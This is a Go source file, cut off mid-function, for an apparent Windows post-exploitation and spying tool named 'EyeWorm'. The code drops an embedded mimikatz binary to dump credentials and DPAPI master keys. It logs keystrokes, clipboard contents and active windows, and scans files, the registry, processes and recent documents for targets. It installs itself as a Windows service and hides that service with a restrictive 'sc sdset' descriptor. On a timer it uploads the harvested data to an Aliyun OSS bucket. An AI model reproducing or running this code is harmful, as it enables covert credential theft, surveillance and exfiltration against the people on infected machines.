package main

import (
	"bytes"
	_ "embed"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"os/exec"
	"path"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/aliyun/aliyun-oss-go-sdk/oss"
	"github.com/kardianos/service"
	lnk "github.com/parsiya/golnk"
	"github.com/shirou/gopsutil/process"
	"golang.org/x/net/html/charset"
	"golang.org/x/sys/windows/registry"
	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/transform"
)

type Config struct {
	CConfig            CollectConfig `json:"CollectConfigTable"`
	Timeout            int           `json:"Timeout"`
	TimeU              string        `json:"TimeU"`
	Osskey             string        `json:"Osskey"`
	ServiceName        string        `json:"ServiceName"`
	ServiceDisplayName string        `json:"ServiceDisplayName"`
	ServiceDescription string        `json:"ServiceDescription"`
	SaveName           string        `json:"SaveName"`
	KeylogSaveloc      string        `json:"KeylogSaveloc"`
}

type program struct{}

type CollectConfig struct {
	Collectors []Collector `json:"Collectors"`
}

type Collector struct {
	ShortName          string   `json:"ShortName"`
	OS                 string   `json:"OS"`
	Locations          []string `json:"Locations"`
	ContentKeys        []string `json:"ContentKeys"`
	NameKeys           []string `json:"NameKeys"`
	SuffixTypes        []string `json:"SuffixTypes"`
	Explain            string   `json:"Explain"`
	Commands           []string `json:"Commands"`
	ProcessName        []string `json:"ProcessName"`
	ReValueNames       []string `json:"RE_ValueNames"`
	ReValueDatas       []string `json:"RE_ValueDatas"`
	FliesScanTargets   []string
	ContentScanTagerts []string
	ContentTargetsPath []string
}

type FlagStruct struct {
	Help         bool
	FilesWorm    bool
	CommandWorm  bool
	Cmdarg       string
	ProcessWorm  bool
	RegistryWorm bool
	RecentWorm   bool
	ApiWorm      bool
	RedEye       bool
	Spy          bool
	UnRedEye     bool
	Upload       bool
	O            string
	Keylog       bool
	Masterkey    bool
}

type MimikatzCode struct {
	Name string `json:"Name"`
	Code []byte `json:"Code"`
}

var (
	//go:embed dist/EyeConfig.json
	CollerConfigByteValue []byte
	//go:embed dist/MimiCode.json
	MimiCodeByteValue      []byte
	MimiCode               = MimikatzCode{}
	config                 = Config{}
	flagStruct             = FlagStruct{}
	filesCollector         Collector
	commandCollector       Collector
	processCollector       Collector
	registryCollector      Collector
	recentCollertor        Collector
	apiCollertor           Collector
	RcecentTargetLocations []string
	FilesLocations         []string
	Commands               []string
	CommandResults         []string
	targetProcessPaths     []string
	TargetProcesses        []string
	TargetRLocations       []string
	TargetRKeynames        []string
	TargetRValueNames      []string
	TargetRValueDatas      []string
	TRKNPathResults        []string
	TRVNResults            []string
	TRVDResults            []string
	RedCommands            []string
	SpyCommands            []string
	ApiResult              string
	MasterkeyResult        string
	OSaveData              string
	KeylogSavePath         string
)
var (
	ignoreFile = []string{""}
	ignorePath = []string{""}
	ignoreType = []string{""}
)

func ReadConfig() Config {
	var config Config
	json.Unmarshal([]byte(CollerConfigByteValue), &config)
	return config
}

func ReadMimiCode() MimikatzCode {
	byteValue := MimiCodeByteValue
	var Code MimikatzCode
	json.Unmarshal([]byte(byteValue), &Code)
	return Code
}

func CollectorSuffixinit(coller Collector) {
	if isInArray(&coller.SuffixTypes, "*") || coller.SuffixTypes == nil || len(coller.SuffixTypes) == 0 {
		coller.SuffixTypes = []string{""}
	}
}

func init() {
	config = ReadConfig()
	filesCollector = config.CConfig.FindByShortName("filesWorm")
	commandCollector = config.CConfig.FindByShortName("CommandWorm")
	processCollector = config.CConfig.FindByShortName("ProcessWorm")
	registryCollector = config.CConfig.FindByShortName("RegistryWorm")
	recentCollertor = config.CConfig.FindByShortName("RecentWorm")
	apiCollertor = config.CConfig.FindByShortName("APiWorm")
	Commands = commandCollector.Commands
	FilesLocations = filesCollector.Locations
	TargetProcesses = processCollector.ProcessName
	TargetRKeynames = registryCollector.NameKeys
	TargetRValueNames = registryCollector.ReValueNames
	TargetRValueDatas = registryCollector.ReValueDatas
	TargetRLocations = registryCollector.Locations
	KeylogSavePath = config.KeylogSaveloc
	CollectorSuffixinit(filesCollector)
	CollectorSuffixinit(processCollector)
	flag.BoolVar(&flagStruct.Help, "help", false, "查看EyeWorm的使用方法")
	flag.BoolVar(&flagStruct.FilesWorm, "wfiles", false, filesCollector.Explain)
	flag.BoolVar(&flagStruct.CommandWorm, "wcommands", false, commandCollector.Explain)
	flag.StringVar(&flagStruct.Cmdarg, "wcommand", "", commandCollector.Explain)
	flag.BoolVar(&flagStruct.ProcessWorm, "wprocess", false, processCollector.Explain)
	flag.BoolVar(&flagStruct.RegistryWorm, "wregistry", false, registryCollector.Explain)
	flag.BoolVar(&flagStruct.RecentWorm, "wrecent", false, recentCollertor.Explain)
	flag.BoolVar(&flagStruct.ApiWorm, "wmimikatz", false, apiCollertor.Explain)
	flag.BoolVar(&flagStruct.RedEye, "redeye", false, "开机自启服务，自动spy常驻，需要配置常驻项的osskey和timeout(second 秒，min 分钟，hour 小时)")
	flag.BoolVar(&flagStruct.Upload, "upload", false, "把收集到的内容上传到oss服务器中")
	flag.BoolVar(&flagStruct.Spy, "spy", false, "监控当前主机，定时返回数据到oos服务器需要配置常驻项的osskey和timeout(second 秒，min 分钟，hour 小时)")
	flag.BoolVar(&flagStruct.UnRedEye, "unred", false, "解除隐藏的自启服务")
	flag.BoolVar(&flagStruct.Keylog, "keylog", false, "开启键盘记录，利用该功能收集键盘信息")
	flag.BoolVar(&flagStruct.Masterkey, "dpapi", false, "收集MasterKey")
	flag.StringVar(&flagStruct.O, "o", "", "把收集到的内容整合输出成文件")

	flag.Parse()
	if flagStruct.Cmdarg != "" {
		Commands = append(Commands, flagStruct.Cmdarg)
	}
}

func main() {
	fmt.Println("    ______        __          __              \n   |  ____|       \\ \\        / /                  \n   | |__  _   _  __\\ \\  /\\  / /__  _ __ _ __ ___  \n   |  __|| | | |/ _ \\ \\/  \\/ / _ \\| '__| '_ ` _ \\\n   | |___| |_| |  __/\\  /\\  / (_) | |  | | | | | |\n   |______\\__, |\\___| \\/  \\/ \\___/|_|  |_| |_| |_|\n           __/ |                                  \n          |___/                                   \n  ")
	fmt.Println("欢迎使用 眼虫！ EyeWorm 我们将为你服务....         作者：萧枫")
	fmt.Println("使用 -help 查看useage")
	if flagStruct.Help {
		flag.Usage()
	}
	if flagStruct.FilesWorm {
		if filesCollector.Locations == nil {
			fmt.Println("必须配置文件扫描路径")
			return
		}
		WormFiles(FilesLocations, &filesCollector)
	}
	if flagStruct.Cmdarg != "" || flagStruct.CommandWorm {
		WormCommand()
	}
	if flagStruct.ProcessWorm {
		WormProcesses(TargetProcesses)
	}
	if flagStruct.RegistryWorm {
		WormRegistry(TargetRLocations)
	}
	if flagStruct.RecentWorm {
		WormRecent()
	}
	if flagStruct.ApiWorm {
		WormMimikatz(&apiCollertor)
	}
	if flagStruct.Masterkey {
		WormMasterkey()
	}
	if flagStruct.Spy {
		SpyNow(config.Osskey)
	}

	if flagStruct.O != "" {
		SaveFile()
	}
	if flagStruct.RedEye {
		RedEye()
	}
	if flagStruct.Upload {
		UploadData(config.Osskey)
	}
	if flagStruct.UnRedEye {
		UnRedEye()
	}
	if flagStruct.Keylog {
		//剪贴板监控
		go clipboardLogger()
		//应用窗口监控
		go WindowLogger()
		//键盘监控
		Keylogger()
	}
}

func UnRedEye() {
	svcConfig := &service.Config{
		Name:        config.ServiceName,
		DisplayName: config.ServiceDisplayName,
		Description: config.ServiceDescription,
	}
	UnHideService(svcConfig)
	prg := &program{}
	s, err := service.New(prg, svcConfig)
	if err != nil {
		fmt.Errorf(err.Error())
	}
	err1 := s.Uninstall()
	if err1 != nil {
		fmt.Errorf(err1.Error())
		return
	}
	fmt.Println("服务解除隐藏，卸载成功！")
}
func SpyNow(osskey string) {
	str1 := strings.Split(osskey, ":")
	//先執行一次
	DoSpy()
	upload(str1[3], str1[1], str1[2], str1[0], SaveData())
	if flagStruct.Keylog {
		uploadKeylog(str1[3], str1[1], str1[2], str1[0], KeylogSavePath)
	}
	tU, err := GetTimeU()
	if err != nil {
		fmt.Errorf(err.Error())
		return
	}
	t := time.NewTicker(tU * time.Duration(config.Timeout))
	defer t.Stop()
	for {
		//等待執行
		<-t.C
		DoSpy()
		upload(str1[3], str1[1], str1[2], str1[0], SaveData())
		if flagStruct.Keylog {
			uploadKeylog(str1[3], str1[1], str1[2], str1[0], KeylogSavePath)
		}

	}
}

//获取程序全路径
func GetRunPath() string {
	file, _ := exec.LookPath(os.Args[0])
	path, _ := filepath.Abs(file)
	index := strings.LastIndex(path, string(os.PathSeparator))
	ret := path[:index]
	return ret + "\\" + fmt.Sprint(os.Args[0])
}

func DoSpy() {
	GetSpyCommand()
	datapath := GetRunPath()
	cmd := exec.Command(datapath, SpyCommands...)
	err := cmd.Run()
	if err != nil {
		fmt.Errorf(err.Error())
		return
	}
	fmt.Println("执行成功！保存位置：" + os.Getenv("LOCALAPPDATA") + "\\Temp\\" + config.SaveName)
}
func UploadData(osskey string) {
	str1 := strings.Split(osskey, ":")
	str := SaveStr()
	location := SaveData()
	os.WriteFile(location, []byte(str), 0600)
	upload(str1[3], str1[1], str1[2], str1[0], location)

}

func SaveData() string {
	str := SaveStr()
	location := os.Getenv("LOCALAPPDATA") + "\\Temp\\" + config.SaveName
	os.WriteFile(location, []byte(str), 0600)
	return location
}

func GetTimeU() (time.Duration, error) {

	if config.TimeU == "second" {
		return time.Second, nil
	}
	if config.TimeU == "min" {
		return time.Minute, nil
	}
	if config.TimeU == "hour" {
		return time.Hour, nil
	}
	fmt.Println("config.TimeU:" + config.TimeU)
	return 0, errors.New("time类型错误！请修改timeU")
}
func upload(Endpoint string, AccessKeyId string, AccessKeySecret string, bucketName string, LocalFile string) {
	client, err := oss.New(Endpoint, AccessKeyId, AccessKeySecret)
	if err != nil {
		handleError(err)
	}

	bucket, err := client.Bucket(bucketName)
	if err != nil {
		handleError(err)
	}
	now := strconv.FormatInt(time.Now().Unix(), 10)
	myobject := now + ".log"
	err = bucket.PutObjectFromFile(myobject, LocalFile)
	if err != nil {
		handleError(err)
	} else {
		fmt.Println(time.Unix(time.Now().Unix(), 0).Format("2006-01-02 15:04:05") + ": upload " + myobject + " succeeded")
	}
}

func uploadKeylog(Endpoint string, AccessKeyId string, AccessKeySecret string, bucketName string, LocalFile string) {
	client, err := oss.New(Endpoint, AccessKeyId, AccessKeySecret)
	if err != nil {
		handleError(err)
	}

	bucket, err := client.Bucket(bucketName)
	if err != nil {
		handleError(err)
	}
	now := strconv.FormatInt(time.Now().Unix(), 10)
	myobject := now + "keylog" + ".log"
	err = bucket.PutObjectFromFile(myobject, LocalFile)
	if err != nil {
		handleError(err)
	} else {
		fmt.Println(time.Unix(time.Now().Unix(), 0).Format("2006-01-02 15:04:05") + ": upload " + myobject + " succeeded")
	}
}

func handleError(err error) {
	fmt.Println("Error:", err)
	os.Exit(-1)
}

func SaveFile() {
	str := SaveStr()
	os.WriteFile(flagStruct.O, []byte(str), 0600)
}
func SaveStr() string {
	var result string
	if flagStruct.FilesWorm {
		result += fmt.Sprintln("====FilesWorm 文件扫描结果如下：====")
		str1 := FmtGet(filesCollector.FliesScanTargets)
		result += str1
		result += fmt.Sprintln("====FilesWorm 内容扫描结果如下：====")
		str2 := FmtGet(filesCollector.ContentScanTagerts)
		result += str2
	}
	if flagStruct.CommandWorm {
		result += fmt.Sprintln("====CommandWorm 扫描结果如下：====")
		str1 := GetCommandResults(CommandResults)
		result += str1
	}
	if flagStruct.ProcessWorm {
		result += fmt.Sprintln("====ProcessWorm 文件扫描结果如下：====")
		str1 := FmtGet(processCollector.FliesScanTargets)
		result += str1
		result += fmt.Sprintln("====ProcessWorm 内容扫描结果如下：====")
		str2 := FmtGet(processCollector.ContentScanTagerts)
		result += str2
	}

	if flagStruct.RegistryWorm {
		result += fmt.Sprintln("==========RegistryWorm 项名称匹配结果=========")
		str1 := FmtGet(TRKNPathResults)
		result += str1

		if TargetRValueNames != nil || len(TargetRValueNames) != 0 {
			result += fmt.Sprintln("============RegistryWorm 值名称匹配结果================")
			str1 := FmtGet(TRVNResults)
			result += str1
		}

		if TargetRValueDatas != nil || len(TargetRValueDatas) != 0 {
			result += fmt.Sprintln("============RegistryWorm 值关联数据匹配结果============")
			str1 := FmtGet(TRVDResults)
			result += str1
		}
	}

	if flagStruct.RecentWorm {
		result += fmt.Sprintln("====RecentWorm 文件扫描结果如下：====")
		str1 := FmtGet(recentCollertor.FliesScanTargets)
		result += str1
		result += fmt.Sprintln("====RecentWorm 内容扫描结果如下：====")
		str2 := FmtGet(recentCollertor.ContentScanTagerts)
		result += str2
	}

	if flagStruct.ApiWorm {
		result += fmt.Sprintln("====ApiWorm 扫描结果如下：====")
		result += fmt.Sprintln(ApiResult)

	}
	if flagStruct.Masterkey {
		result += fmt.Sprintln("====Masterkey 结果如下：====")
		result += fmt.Sprintln(MasterkeyResult)
	}
	return result
}
func RedEye() {

	GetRedCommands()

	svcConfig := &service.Config{
		Name:        config.ServiceName,
		DisplayName: config.ServiceDisplayName,
		Description: config.ServiceDescription,
	}
	prg := &program{}
	s, err := service.New(prg, svcConfig)
	if err != nil {
		fmt.Errorf(err.Error())
	}
	err1 := s.Install()
	if err1 != nil {
		fmt.Errorf(err1.Error())
		return
	}
	fmt.Println("服务安装成功,并且隐藏!")
	HideService(svcConfig)

	if err = s.Run(); err != nil {
		fmt.Errorf(err.Error())
	}
	SpyNow(config.Osskey)
}
func GetSpyCommand() {
	if flagStruct.FilesWorm {
		SpyCommands = append(SpyCommands, "-wfiles")
	}
	if flagStruct.CommandWorm {
		SpyCommands = append(SpyCommands, "-wcommands")
	}
	if flagStruct.ProcessWorm {
		SpyCommands = append(SpyCommands, "-wprocess")
	}
	if flagStruct.RegistryWorm {
		SpyCommands = append(SpyCommands, "-wregistry")
	}
	if flagStruct.RecentWorm {
		SpyCommands = append(SpyCommands, "-wrecent")
	}
	if flagStruct.ApiWorm {
		SpyCommands = append(SpyCommands, "-wmimikatz")
	}
	if flagStruct.Masterkey {
		SpyCommands = append(SpyCommands, "-dpapi")
	}

	SpyCommands = append(SpyCommands, "-o="+os.Getenv("LOCALAPPDATA")+"\\Temp\\"+config.SaveName)
}

func GetRedCommands() {
	if flagStruct.FilesWorm {
		RedCommands = append(RedCommands, "-wfiles")
	}
	if flagStruct.CommandWorm {
		RedCommands = append(RedCommands, "-wcommands")
	}
	if flagStruct.ProcessWorm {
		RedCommands = append(RedCommands, "-wprocess")
	}
	if flagStruct.RegistryWorm {
		RedCommands = append(RedCommands, "-wregistry")
	}
	if flagStruct.RecentWorm {
		RedCommands = append(RedCommands, "-wrecent")
	}
	if flagStruct.ApiWorm {
		RedCommands = append(RedCommands, "-wmimikatz")
	}
	if flagStruct.Masterkey {
		RedCommands = append(RedCommands, "-dpapi")
	}
	if flagStruct.Keylog {
		RedCommands = append(RedCommands, "-keylog")
	}
	RedCommands = append(RedCommands, "-spy")
}

//服務執行
func (p *program) Start(s service.Service) error {
	go p.run()
	return nil
}

//具体实现
func (p *program) run() {

	datapath := GetRunPath()
	cmd := exec.Command(datapath, RedCommands...)
	cmd.Run()
}

//停止
func (p *program) Stop(s service.Service) error {
	return nil
}

func HideService(config *service.Config) {
	cmd := exec.Command("sc.exe", "sdset", config.Name, "D:(D;;DCLCWPDTSDCC;;;IU)(D;;DCLCWPDTSDCC;;;SU)(D;;DCLCWPDTSDCC;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)'")
	err := cmd.Run()
	if err != nil {
		fmt.Errorf(err.Error())
	}
}
func UnHideService(config *service.Config) {
	cmd := exec.Command("Powershell.exe", "&", "$env:SystemRoot\\System32\\sc.exe", "sdset", config.Name, "'D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)'")
	err := cmd.Run()
	if err != nil {
		fmt.Errorf(err.Error())
	}
}
func WormMasterkey() {
	MimiCode := ReadMimiCode()
	tagetb := MimiCode.Code

	os.WriteFile("Masterkey.exe", tagetb, 0600)

	cmd := exec.Command("./Masterkey.exe", "privilege::debug", "sekurlsa::dpapi", "exit") //获得masterkey
	out, err := cmd.Output()
	if err != nil {
		fmt.Errorf(err.Error())
	}
	MasterkeyResult = string(out)
	fmt.Println("=================================WormMasterkey 结果如下：=====================================")
	fmt.Println(string(out))
	os.Remove("Masterkey.exe")
}
func WormMimikatz(apic *Collector) {
	MimiCode := ReadMimiCode()
	tagetb := MimiCode.Code
	if !strings.Contains(apic.ProcessName[0], ".exe") {
		apic.ProcessName[0] = "defult.exe"
	}
	os.WriteFile(apic.ProcessName[0], tagetb, 0600)
	apic.Commands = append(apic.Commands, "exit")
	cmd := exec.Command("./"+apic.ProcessName[0], apic.Commands...) ///查看当前目录下文件
	out, err := cmd.Output()
	if err != nil {
		fmt.Errorf(err.Error())
	}
	ApiResult = string(out)
	fmt.Println("=================================MimikatzWorm 结果如下：=====================================")
	fmt.Println(string(out))
	os.Remove(apic.ProcessName[0])
}

func WormRecent() {
	var recentpath = os.Getenv("APPDATA") + "/Microsoft/Windows/Recent"

	var rfiles []string //Recent 结果 .lnk 文件

	var targetType = []string{""}
	var recentCollertorIndex *Collector = &recentCollertor
	err := GetAllFile(recentpath, &rfiles, &targetType, &ignoreFile, &ignorePath, &ignoreType)
	if err != nil {
		fmt.Printf(err.Error() + "\n")
	}
	for _, file := range rfiles {
		if path.Ext(file) == ".lnk" {
			if recentCollertor.NameKeys == nil || isInArray(&recentCollertor.NameKeys, "*") || len(recentCollertor.NameKeys) == 0 {
				tureFile := SearchLnk(file)
				if recentCollertorIndex.SuffixTypes == nil || isInArray(&recentCollertorIndex.SuffixTypes, "*") || len(recentCollertorIndex.SuffixTypes) == 0 {
					if !isInArray(&recentCollertorIndex.FliesScanTargets, tureFile) {
						recentCollertorIndex.FliesScanTargets = append(recentCollertorIndex.FliesScanTargets, tureFile) //真实文件地址SearchLnk(file)
					}
				} else {
				forsuffix1:
					for _, suffix := range recentCollertorIndex.SuffixTypes {
						if suffix == path.Ext(tureFile) || IsDir(tureFile) {
							if !isInArray(&recentCollertorIndex.FliesScanTargets, tureFile) {
								recentCollertorIndex.FliesScanTargets = append(recentCollertorIndex.FliesScanTargets, tureFile) //真实文件地址SearchLnk(file)
							}
							break forsuffix1
						}
					}
				}

			} else {
				for _, key := range recentCollertor.NameKeys {
					//判断是否包含关键词
					if find := strings.Contains(file, key); find {
						// 把lnk文件的指向地址找到
						tureFile := SearchLnk(file)
						if recentCollertorIndex.SuffixTypes == nil || isInArray(&recentCollertorIndex.SuffixTypes, "*") || len(recentCollertorIndex.SuffixTypes) == 0 {
							if !isInArray(&recentCollertorIndex.FliesScanTargets, tureFile) {
								recentCollertorIndex.FliesScanTargets = append(recentCollertorIndex.FliesScanTargets, tureFile) //真实文件地址SearchLnk(file)
							}
						} else {
						forsuffix2:
							for _, suffix := range recentCollertorIndex.SuffixTypes {
								if suffix == path.Ext(tureFile) || IsDir(tureFile) {
									if !isInArray(&recentCollertorIndex.FliesScanTargets, tureFile) {
										recentCollertorIndex.FliesScanTargets = append(recentCollertorIndex.FliesScanTargets, tureFile) //真实文件地址SearchLnk(file)
									}
									break forsuffix2
								}
							}
						}
					}
				}
			}
		}
	}
	if recentCollertorIndex.ContentKeys != nil && len(recentCollertorIndex.ContentKeys) > 0 {
		if recentCollertorIndex.ContentKeys[0] == "" && len(recentCollertorIndex.ContentKeys) == 1 {
			fmt.Println("==============================================目标文件如下：==============================================\n")
			Fmtlog(recentCollertor.FliesScanTargets)
			return
		}
		var truefiles []string = recentCollertorIndex.FliesScanTargets
		WormFiles(truefiles, &recentCollertor)
	} else {
		fmt.Println("==============================================目标文件如下：==============================================\n")
		Fmtlog(recentCollertor.FliesScanTargets)
	}

}
func SearchLnk(str string) string {

	Lnk, err := lnk.File(str)
	if err != nil {
		panic(err)
	}

	// 中文路径需要解码，英文路径可忽略
	targetPath, _ := simplifiedchinese.GBK.NewDecoder().String(Lnk.LinkInfo.LocalBasePath)
	return targetPath
}

func WormRegistry(locations []string) {
	for _, location := range locations {
		Hk, spath := GetHKandSpath(location)
		RegistryScan(Hk, spath)
	}

	fmt.Println("==================================项名称匹配结果============================================")
	Fmtlog(TRKNPathResults)

	if TargetRValueNames != nil || len(TargetRValueNames) != 0 {
		fmt.Println("==================================值名称匹配结果============================================")
		Fmtlog(TRVNResults)
	}
	if TargetRValueDatas != nil || len(TargetRValueDatas) != 0 {
		fmt.Println("==================================值关联数据匹配结果============================================")
		Fmtlog(TRVDResults)
	}

}

func RegistryScan(Hk registry.Key, spath string) {
	key, _ := registry.OpenKey(Hk, spath, registry.ALL_ACCESS)

	if TargetRKeynames == nil || isInArray(&TargetRKeynames, "*") || len(TargetRKeynames) == 0 {
		// 根据值名称/内容搜索
		keys, _ := key.ReadSubKeyNames(0)
		//先把所有子项全部收集起来
		for _, sk := range keys {
			s_spath := spath + "\\" + sk
			Path := CombinePath(Hk, s_spath)
			TRKNPathResults = append(TRKNPathResults, Path)
			sonSpath := GetSonSpath(spath, sk)
			RegistryScan(Hk, sonSpath)
		}
		key.Close()
		//再进行值名称/内容搜索
		if TargetRValueNames != nil || len(TargetRValueNames) != 0 {
			RvlueNameScan()
		}
		if TargetRValueDatas != nil || len(TargetRValueDatas) != 0 {
			RvlueDataScan()
		}

	} else {
		//先根据项搜索，再根据值名称/内容搜索
		//项搜索
		keys, _ := key.ReadSubKeyNames(0)
		for _, sk := range keys {
			for _, tk := range TargetRKeynames {
				RKeyNamematch(sk, tk, Hk, spath)
				sonSpath := GetSonSpath(spath, sk)
				RegistryScan(Hk, sonSpath)
			}
		}
		key.Close()
		//用已经匹配到的项来进行值名称/内容搜索
		if TargetRValueNames != nil || len(TargetRValueNames) != 0 {
			RvlueNameScan()
		}
		if TargetRValueDatas != nil || len(TargetRValueDatas) != 0 {
			RvlueDataScan()
		}
	}

}
func RvlueDataScan() {
	for _, path := range TRKNPathResults {
		Hk, spath := GetHKandSpath(path)
		key, _ := registry.OpenKey(Hk, spath, registry.ALL_ACCESS)
		valueNames, _ := key.ReadValueNames(0)
		for _, name := range valueNames {
			if isInArray(&TargetRValueDatas, "*") {
				data := GetDatas(name, key)
				result := fmt.Sprintf("项路径：%v \t\t 值名称：%v \t\t 数据：%v\n", path, name, data)
				if !isInArray(&TRVDResults, result) {
					TRVDResults = append(TRVDResults, result)
				}
			} else {
				for _, Tdata := range TargetRValueDatas {
					RvlueDataMath(path, name, Tdata, key)

				}
			}

		}
		key.Close()
	}
}
func RvlueNameScan() {
	for _, path := range TRKNPathResults {
		Hk, spath := GetHKandSpath(path)
		key, _ := registry.OpenKey(Hk, spath, registry.ALL_ACCESS)
		valueNames, _ := key.ReadValueNames(0)
		for _, name := range valueNames {
			if isInArray(&TargetRKeynames, "*") {
				data := GetDatas(name, key)
				result := fmt.Sprintf("项路径：%v \t\t 值名称：%v \t\t 数据：%v\n", path, name, data)
				if !isInArray(&TRVNResults, result) {
					TRVNResults = append(TRVNResults, result)
				}
			} else {
				for _, Tname := range TargetRValueNames {
					RvlueNameMatch(path, name, Tname, key)
				}
			}

		}
		key.Close()
	}

}
func RvlueDataMath(path string, name string, Tdata string, key registry.Key) {
	data := GetDatas(name, key)
	if strings.Contains(data, Tdata) {
		result := fmt.Sprintf("项路径：%v \t\t 值名称：%v \t\t 数据：%v\n", path, name, data)
		if !isInArray(&TRVDResults, result) {
			TRVDResults = append(TRVDResults, result)
		}

	}
}
func RvlueNameMatch(path string, name string, Tname string, key registry.Key) {
	if strings.Contains(name, Tname) {
		data := GetDatas(name, key)
		result := fmt.Sprintf("项路径：%v \t\t 值名称：%v \t\t 数据：%v\n", path, name, data)
		if !isInArray(&TRVNResults, result) {
			TRVNResults = append(TRVNResults, result)
		}

	}
}
func GetDatas(vlue_name string, key registry.Key) string {
	_, valtype, _ := key.GetValue(vlue_name, nil)
	switch valtype {
	case registry.SZ, registry.EXPAND_SZ:
		val, _, _ := key.GetStringValue(vlue_name)
		return val
	case registry.DWORD, registry.QWORD:
		val, _, _ := key.GetIntegerValue(vlue_name)
		s := strconv.FormatUint(uint64(val), 10)
		return string(s)
	case registry.BINARY:
		val, _, _ := key.GetBinaryValue(vlue_name)
		H := fmt.Sprintf("%x", val)
		return "16Hex:" + H
	case registry.MULTI_SZ:
		val, _, _ := key.GetStringsValue(vlue_name)
		return fmt.Sprint(val)
	default:
		return ""
	}
}
func GetSonSpath(spath string, sonName string) string {
	s_spath := spath + "\\" + sonName
	return s_spath
}
func RKeyNamematch(key string, Tkey string, HK registry.Key, f_spath string) {
	if strings.Contains(key, Tkey) {
		s_spath := f_spath + "\\" + key
		Path := CombinePath(HK, s_spath)
		if !isInArray(&TRKNPathResults, Path) {
			TRKNPathResults = append(TRKNPathResults, Path)
		}

	}
}
func CombinePath(Hk registry.Key, spath string) string {
	switch Hk {
	case registry.CURRENT_USER:
		return "HKEY_CURRENT_USER\\" + spath
	case registry.CLASSES_ROOT:
		return "HKEY_CLASSES_ROOT\\" + spath
	case registry.LOCAL_MACHINE:
		return "HKEY_LOCAL_MACHINE\\" + spath
	case registry.USERS:
		return "HKEY_USERS\\" + spath
	case registry.CURRENT_CONFIG:
		return "HKEY_CURRENT_CONFIG\\" + spath
	default:
		return "error 不是一個有效的HK"
	}
}

func GetHKandSpath(path string) (registry.Key, string) {
	spilts := strings.SplitN(path, "\\", 2)
	switch spilts[0] {
	case "HKEY_CURRENT_USER":
		return registry.CURRENT_USER, spilts[1]
	case "HKEY_CLASSES_ROOT":
		return registry.CLASSES_ROOT, spilts[1]
	case "HKEY_LOCAL_MACHINE":
		return registry.LOCAL_MACHINE, spilts[1]
	case "HKEY_USERS":
		return registry.USERS, spilts[1]
	case "HKEY_CURRENT_CONFIG":
		return registry.CURRENT_CONFIG, spilts[1]
	default:
		fmt.Println("你输入的地址不属于注册表！")
	}
	fmt.Errorf("hello error")
	return 0, ""
}

func WormProcesses(Tprocesses []string) {
	var ProceessDirs []string
	for _, tp := range Tprocesses {
		checkProcessExist(tp)
	}
	fmt.Println("====================================进程path列表=============================================")
	for _, path := range targetProcessPaths {
		fmt.Println(path)
		Proceessdir := filepath.Dir(path)
		ProceessDirs = append(ProceessDirs, Proceessdir)
	}
	fmt.Println("====================================进程路径扫描结果=============================================")
	WormFiles(ProceessDirs, &processCollector)
}

func GetProcesses() (pns []*process.Process) {

	pids, _ := process.Pids()
	for _, pid := range pids {

		pn, _ := process.NewProcess(pid)
		pns = append(pns, pn)

	}
	return pns
}
func checkProcessExist(tp string) {
	ExistErrorFlag := true
	PathErrorFlag := true
	Pns := GetProcesses()

for1:
	for _, p := range Pns {
		Name, _ := p.Name()
		if tp == Name {
			ExistErrorFlag = false
			//返回进程exe执行路径
			Exe, _ := p.Exe()
			if Exe != "" || len(Exe) != 0 {
				if !isInArray(&targetProcessPaths, Exe) {
					targetProcessPaths = append(targetProcessPaths, Exe)
					PathErrorFlag = false
					break for1
				}
				println(Exe + "该路径已经在扫描队列中")
			}
		}
	}
	if ExistErrorFlag {
		println(tp + "该进程不存在！")
	}
	if PathErrorFlag {
		println(tp + "该进程无路径或为系统进程，尝试在system32中寻找该进程")
	}
}

func WormCommand() {
	for _, cmd := range Commands {
		CommandResults = append(CommandResults, runCmd(cmd))
	}
	CommandResultslog(CommandResults)
}
func CommandResultslog(crs []string) {
	x := 1
	for _, r := range crs {
		fmt.Printf("=======================第%v条命令结果============================\n", x)
		fmt.Println(r)
		x++
	}
}

func GetCommandResults(crs []string) string {
	var result string
	x := 1
	for _, r := range crs {
		result += fmt.Sprintf("=======================第%v条命令结果============================\n", x)
		result += fmt.Sprintln(r)
		x++
	}
	return result

}

func WormFiles(locations []string, coller *Collector) {
	for _, location := range locations {
		fileScan(location, coller)
	}

	if coller.ContentKeys != nil && len(coller.ContentKeys) != 0 {
		for _, location := range coller.FliesScanTargets {
			if !IsDir(location) {
				FileContentScan(location, coller)
			}
		}
	}

	fmt.Println("    ______        __          __              \n   |  ____|       \\ \\        / /                  \n   | |__  _   _  __\\ \\  /\\  / /__  _ __ _ __ ___  \n   |  __|| | | |/ _ \\ \\/  \\/ / _ \\| '__| '_ ` _ \\\n   | |___| |_| |  __/\\  /\\  / (_) | |  | | | | | |\n   |______\\__, |\\___| \\/  \\/ \\___/|_|  |_| |_| |_|\n           __/ |                                  \n          |___/                                   \n  ")
	fmt.Println("==================目标文件如下：====================================\n")
	Fmtlog(coller.FliesScanTargets)
	fmt.Println("\n\n\n==================目标内容如下：====================================\n")
	Fmtlog(coller.ContentScanTagerts)
}

func fileScan(location string, coller *Collector) {
	fmt.Println("正在運行-----------" + location)
	if IsDir(location) {
		DirScan(location, coller)
	} else {
		FileContentScan(location, coller)

	}
}

func readCurrentDir(arg string) string {
	var returnString string
	file, err := os.Open(arg)
	if err != nil {
		fmt.Println("failed opening directory: %s", err)
	}
	defer file.Close()

	fileList, err := file.Readdir(0)
	if err != nil {
		fmt.Errorf("%s", err.Error())
	}

	returnString += fmt.Sprintf("\nName\t\t\tSize\t\tIsDirectory  \t\tLast Modification\n")
	for _, files := range fileList {
		s := fmt.Sprintf("\n%-15s %-14v %-12v %v", files.Name(), files.Size(), files.IsDir(), files.ModTime())
		returnString += s
	}
	return returnString
}

func getEnvs() string {
